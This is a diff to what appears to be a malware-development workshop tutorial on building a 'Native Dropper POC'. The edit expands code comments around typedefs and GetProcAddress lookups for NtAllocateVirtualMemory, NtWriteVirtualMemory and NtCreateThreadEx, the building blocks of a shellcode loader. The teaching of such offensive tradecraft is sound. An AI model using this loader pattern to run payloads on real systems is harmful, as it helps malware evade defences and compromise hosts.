@@ -28,7 +28,8 @@ First we need to define the function pointers for all the native functions we ne
 <details>
     
  ```
- // Define function pointers for native API functions
+// Define typedefs for function pointers to the native API functions we'll be using.
+// These match the function signatures of the respective functions.
 typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
 typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
 typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
@@ -40,7 +41,8 @@ The second step is to get the memory address of each native function from ntdll.
 <details>
     
 ```
-// Load native API functions from ntdll.dll
+// Here we load the native API functions from ntdll.dll using GetProcAddress, which retrieves the address of an exported function
+// or variable from the specified dynamic-link library (DLL). The return value is then cast to the appropriate function pointer typedef.
     PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");    
 ```    
      
@@ -51,7 +53,8 @@ The second step is to get the memory address of each native function from ntdll.
 If it was at this time not possible for you to complete the code for the three missing native functions, you can use the following code and copy it into the Native Dropper POC. 
 
 ```
-// Load native API functions from ntdll.dll
+// Here we load the native API functions from ntdll.dll using GetProcAddress, which retrieves the address of an exported function
+    // or variable from the specified dynamic-link library (DLL). The return value is then cast to the appropriate function pointer typedef.
     PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
     PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
     PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
